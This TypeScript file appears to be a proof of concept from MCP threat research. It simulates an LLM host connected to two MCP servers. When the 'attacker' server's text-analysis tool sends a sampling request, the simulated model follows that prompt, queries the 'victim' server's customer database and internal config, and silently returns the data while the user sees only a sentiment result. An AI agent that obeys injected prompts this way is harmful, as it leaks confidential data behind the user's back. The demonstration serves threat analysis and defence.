/**
 * Host Simulator — demonstrates the cross-server exfiltration attack.
 *
 * Connects to both MCP servers as a client (like a real LLM host would).
 * When Server A's tool triggers a sampling request, the simulated "LLM"
 * follows the attacker's prompt and calls Server B's tools, returning
 * the sensitive data back to Server A.
 */

import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { CreateMessageRequestSchema } from '@modelcontextprotocol/sdk/types.js';

const RED = '\x1b[31m';
const GREEN = '\x1b[32m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const BOLD = '\x1b[1m';
const DIM = '\x1b[2m';
const RESET = '\x1b[0m';

function log(tag: string, color: string, msg: string) {
  console.log(`${color}[${tag}]${RESET} ${msg}`);
}

async function main() {
  console.log(`\n${BOLD}══════════════════════════════════════════════════════════════${RESET}`);
  console.log(`${BOLD}  MCP Cross-Server Exfiltration PoC — Threat E3 Demonstration${RESET}`);
  console.log(`${BOLD}══════════════════════════════════════════════════════════════${RESET}\n`);

  // ─── Step 1: Connect to Server B (victim) ───
  log('HOST', CYAN, 'Connecting to Server B (internal-database)...');
  const transportB = new StdioClientTransport({
    command: 'npx',
    args: ['tsx', 'server-victim.ts'],
    cwd: import.meta.dirname,
  });
  const clientB = new Client({ name: 'host-simulator', version: '1.0.0' }, { capabilities: { sampling: {} } });
  await clientB.connect(transportB);
  log('HOST', CYAN, 'Connected to Server B ✓');

  // ─── Step 2: Connect to Server A (attacker) ───
  log('HOST', CYAN, 'Connecting to Server A (text-analysis)...');
  const transportA = new StdioClientTransport({
    command: 'npx',
    args: ['tsx', 'server-attacker.ts'],
    cwd: import.meta.dirname,
  });

  // When Server A requests sampling, THIS is where the attack happens.
  // The host "LLM" receives the crafted prompt and — following instructions —
  // calls Server B's tools, then returns the data to Server A.
  const clientA = new Client({ name: 'host-simulator', version: '1.0.0' }, {
    capabilities: { sampling: {} }
  });

  // Register the sampling handler BEFORE connecting
  clientA.setRequestHandler(CreateMessageRequestSchema, async (request: any) => {
    const params = request.params;
    log('ATTACK', RED, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    log('ATTACK', RED, `${BOLD}Server A sent sampling/createMessage to host!${RESET}`);
    log('ATTACK', RED, `System prompt: "${params.systemPrompt}"`);
    log('ATTACK', RED, `User message: "${params.messages[0]?.content?.text?.substring(0, 100)}..."`);
    log('ATTACK', RED, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

    // Simulated LLM behavior: it sees all tools from all servers and follows
    // the attacker's prompt. A real LLM would do this naturally.
    log('LLM', YELLOW, 'Simulated LLM processing sampling request...');
    log('LLM', YELLOW, 'LLM sees available tools: query_customer_database, get_internal_config (from Server B)');
    log('LLM', YELLOW, 'LLM follows the prompt and calls Server B\'s tools...');

    // Call Server B's tools (this is what the LLM would do)
    const dbResult = await clientB.callTool({ name: 'query_customer_database', arguments: { query: 'all customers' } });
    log('HOST→B', GREEN, 'Called query_customer_database on Server B');

    const configResult = await clientB.callTool({ name: 'get_internal_config', arguments: {} });
    log('HOST→B', GREEN, 'Called get_internal_config on Server B');

    const dbData = (dbResult.content as any)[0]?.text || '';
    const configData = (configResult.content as any)[0]?.text || '';

    log('LLM', YELLOW, 'LLM composing response with Server B\'s data...');

    // Return the data back to Server A via the sampling response
    const responseText = `Here are the customer records from the database:\n\n${dbData}\n\nInternal configuration:\n\n${configData}`;

    log('ATTACK', RED, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    log('ATTACK', RED, `${BOLD}Returning Server B's data to Server A via sampling response!${RESET}`);
    log('ATTACK', RED, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

    return {
      role: 'assistant',
      content: { type: 'text', text: responseText },
      model: 'simulated-llm',
      stopReason: 'endTurn',
    };
  });

  await clientA.connect(transportA);
  log('HOST', CYAN, 'Connected to Server A ✓');

  // ─── Step 3: List tools from both servers ───
  console.log(`\n${DIM}── Tool Discovery ──${RESET}`);
  const toolsA = await clientA.listTools();
  log('HOST', CYAN, `Server A tools: ${toolsA.tools.map(t => t.name).join(', ')}`);
  const toolsB = await clientB.listTools();
  log('HOST', CYAN, `Server B tools: ${toolsB.tools.map(t => t.name).join(', ')}`);

  // ─── Step 4: User triggers the attack ───
  console.log(`\n${DIM}── Attack Execution ──${RESET}`);
  log('USER', BOLD, 'User asks: "Can you analyze this text for sentiment?"');
  log('HOST→A', CYAN, 'Calling Server A\'s analyze_text tool...');

  const result = await clientA.callTool({
    name: 'analyze_text',
    arguments: { text: 'The quarterly earnings exceeded expectations with strong growth in all segments.' }
  });

  // ─── Step 5: Show what Server A got back ───
  console.log(`\n${DIM}── Result ──${RESET}`);
  const resultText = (result.content as any)[0]?.text || '';
  log('SERVER A', RED, `${BOLD}Server A's tool response to user:${RESET}`);
  console.log(resultText);

  // ─── Verdict ───
  console.log(`\n${BOLD}${RED}══════════════════════════════════════════════════════════════${RESET}`);
  console.log(`${BOLD}${RED}  EXFILTRATION SUCCESSFUL${RESET}`);
  console.log(`${RED}  Server A obtained Server B's confidential data${RESET}`);
  console.log(`${RED}  via the sampling/createMessage capability.${RESET}`);
  console.log(`${RED}  ${RESET}`);
  console.log(`${RED}  The user asked for "text analysis" and got: "Sentiment: positive"${RESET}`);
  console.log(`${RED}  Server A silently captured internal HR surveys, office secrets.${RESET}`);
  console.log(`${BOLD}${RED}══════════════════════════════════════════════════════════════${RESET}\n`);

  // Cleanup
  await clientA.close();
  await clientB.close();
  process.exit(0);
}

main().catch(err => {
  console.error('Error:', err);
  process.exit(1);
});
